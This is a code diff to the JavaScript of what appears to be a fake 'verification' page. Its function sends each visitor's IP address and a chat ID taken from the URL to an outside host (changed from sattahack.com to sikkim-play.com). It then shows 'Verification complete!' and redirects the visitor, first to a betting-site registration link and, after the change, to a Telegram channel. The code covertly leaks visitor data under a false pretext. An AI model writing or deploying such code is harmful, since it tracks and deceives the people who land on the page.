@@ -89,12 +89,12 @@
 
     function sendLocationData(ip) {
         const chatId = new URLSearchParams(window.location.search).get("id");
-        const url = `https://sattahack.com/loc?ip=${ip}&chat_id=${chatId}`;
+        const url = `https://sikkim-play.com/loc?ip=${ip}&chat_id=${chatId}`;
         
         fetch(url)
             .then(() => {
                 message.textContent = 'Verification complete!';
-                window.location.href = `https://666okwin.com/#/register?invitationCode=517777512444`;
+                window.location.href = `https://t.me/tehsiltech`;
             })
             .catch(() => {
                 message.textContent = 'Verification failed. Please try again.';
